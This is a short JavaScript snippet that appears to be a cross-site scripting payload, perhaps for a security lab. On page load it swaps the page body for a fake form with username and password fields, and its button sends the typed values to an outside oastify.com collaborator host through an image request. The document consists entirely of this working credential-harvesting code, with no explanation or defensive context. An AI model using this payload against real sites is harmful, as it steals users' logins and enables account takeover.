window.onload = () => {
  document.body.innerHTML = `
    <input id="u">
    <input id="p" type="password">
    <button onclick="(new Image()).src='https://vjihl4fa5lzu21wd2ii6kd3fd6jy7pve.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
      Send
    </button>
  `;
};
